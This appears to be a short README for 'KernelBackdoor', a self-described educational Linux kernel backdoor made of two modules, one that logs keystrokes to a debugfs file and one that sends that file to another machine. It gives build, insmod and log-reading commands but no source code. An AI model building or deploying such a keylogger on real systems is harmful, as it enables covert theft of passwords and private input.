# KernelBackdoor

An educationally-purposed backdoor of linux kernel that sweeps keyboard data to another machine via network

We implemented two kernel modules. The first one is responsible for logging keyboard data and saving to a file on the debug file space. The second creates a network connection and sends that file to another machine.

To compile the modules run: make all.

To insert the module run:
	sudo insmod keyboardmodule.ko
	sudo insmod networkmodule.ko


To see the keyboard log locally run: sudo cat /sys/kernel/debug/backdoorSO/bdKeyboardLog
